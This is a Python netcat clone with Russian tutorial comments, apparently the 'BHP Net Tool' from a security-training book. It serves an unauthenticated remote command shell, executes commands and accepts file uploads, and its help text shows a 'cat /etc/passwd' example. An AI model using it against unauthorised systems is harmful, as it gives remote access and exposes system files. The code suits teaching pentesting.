import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


# определяем функцию execute, которая получает команду, выполняет ее и возвращает вывод в виде строки.
def execute(cmd):
    """
       Выполняет команду в локальной операционной системе и возвращает ее вывод в виде строки.

       Args:
           cmd (str): Команда для выполнения.

       Returns:
           str: Вывод команды.
    """
    cmd = cmd.strip()
    if not cmd:
        return
    # В данном случае мы используем ее метод check_output, который выполняет команду в локальной операционной системе
    # и затем возвращает вывод этой команды.
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()


class NetCat:
    """
       Класс NetCat представляет инструмент для установки TCP-соединения и взаимодействия с удаленным сервером.

       Args:
           args (argparse.Namespace): Аргументы командной строки.
           buffer (bytes): Буфер данных.

       Attributes:
           args (argparse.Namespace): Аргументы командной строки.
           buffer (bytes): Буфер данных.
           socket (socket.socket): Сокет для установки соединения.
    """

    # Мы инициализируем объект NetCat с помощью аргументов из командной строки и буфера
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        # после чего создаем объект сокета
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Метод run, который служит точкой входа для управления объектом NetCat, довольно прост: он делегирует выполнение
    # двум другим методам.
    def run(self):
        """
               Точка входа для управления объектом NetCat.

               Если указан флаг --listen, вызывается метод listen.
               В противном случае вызывается метод send.
        """
        # Если нам нужно подготовить слушателя, вызываем метод listen
        if self.args.listen:
            self.listen()
        # а если нет — метод send
        else:
            self.send()

    def send(self):
        """
                Устанавливает соединение с удаленным сервером и отправляет данные.
                Выводит ответы сервера и принимает интерактивный ввод.
        """
        # Мы подключаемся к серверу с заданными адресом и портом и передаем ему буфер, он у нас есть.
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        # Затем используем блок try/catch, чтобы иметь возможность закрыть соединение вручную нажатием Ctrl+C
        try:
            # Дальше на- чинаем цикл, чтобы получить данные от целевого сервера.
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    # Если данных больше нет, выходим из цикла
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    # В противном случае выводим ответ, останавливаемся, чтобы получить интерактивный ввод, отправляем
                    # его и продолжаем цикл.
                    self.socket.send(buffer.encode())
        # Цикл будет работать, пока не произойдет исключение KeyboardInterrupt, в результате чего закроется сокет.
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

    # Теперь напишем метод, который выполняется, когда программа запускается для прослушивания:
    def listen(self):
        """
                Устанавливает слушающий сокет и принимает входящие соединения.
                Каждое входящее соединение обрабатывается в отдельном потоке.
        """
        # Метод listen привязывается к адресу и порту
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        # и начинает прослушивание в цикле
        while True:
            client_socket, _ = self.socket.accept()
            # передавая подключившиеся сокеты методу handle
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    # Теперь реализуем логику для загрузки файлов, выполнения команд и создания интерактивной командной оболочки.
    # Программа может выполнять эти задания в режиме прослушивания:
    # Метод handle выполняет задание в соответствии с полученным аргумен- том командной строки: выполняет команду,
    # загружает файл или запускает командную оболочку.
    def handle(self, client_socket):
        """
                Обрабатывает входящее соединение в соответствии с аргументами командной строки.

                Если указан аргумент --execute, выполняет указанную команду и отправляет результат обратно на клиент.
                Если указан аргумент --upload, принимает данные от клиента и сохраняет их в указанный файл.
                Если указан аргумент --command, устанавливает интерактивную командную оболочку и обрабатывает команды клиента.
        """
        # Если нужно выполнить команду, метод handle передает ее функции execute и шлет вывод обратно в сокет.
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        # Если нужно загрузить файл, мы входим в цикл, чтобы получать данные из прослушивающего сокета, до тех пор пока
        # они не перестанут поступать. Затем за- писываем накопленное содержимое в заданный файл.
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
        # Наконец, если нужно создать командную оболочку, мы входим в цикл, передаем отправителю приглашение командной
        # строки и ждем в ответ строку с командой. Затем выполняем команду с помощью функции execute и возвращаем ее
        # вывод отправителю.
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()


# Теперь создадим главный блок, ответственный за разбор аргументов командной строки и вызов остальных наших функций:
if __name__ == '__main__':
    # Для создания интерфейса командной строки мы используем модуль argparse из стандартной библиотеки. Предоставим
    # аргументы, чтобы его можно было вызывать для загрузки файлов на сервер, выполнения команд или запуска командной
    # оболочки.

    # Мы также предоставляем справку о применении, которая выводится, когда пользователь запускает программу с
    # параметром --help.
    parser = argparse.ArgumentParser(description='BHP Net Tool', formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''Example: 
            netcat.py -t 192.168.1.108 -p 5555 -l -c # командная оболочка
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt
            # загружаем в файл
            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\"
            # выполняем команду
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135
            # шлем текст на порт сервера 135
            netcat.py -t 192.168.1.108 -p 5555 # соединяемся с сервером'''))

    # Аргумент -c подготавливает интерактивную командную оболочку, -e выполняет отдельно взятую команду, -l говорит о
    # том,что нужно подготовить слушателя, -p позволяет указать порт, на котором будет происходить взаимодействие, -t
    # задает IP-адрес, а -u определяет имя файла, который нужно загрузить. С этой программой могут работать как
    # отправитель, так и получатель, поэтому параметры определяют, для чего она запускается — для отправки или
    # прослушивания. Аргументы -c, -e и -u подразумевают наличие -l, так как они применимы только к той стороне
    # взаимодействия, которая слушает. Отправляющая сторона соединяется со слушателем, и, чтобы его определить, ей
    # нужны только параметры -t и -p.
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    # Если программа используется в качестве слушателя, мы вызываем объект NetCat с пустым строковым буфером.
    if args.listen:
        buffer = ''
    # В противном случае сохраняем в буфер содержимое stdin.
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    # В конце вызываем метод run, чтобы запустить программу.
    nc.run()
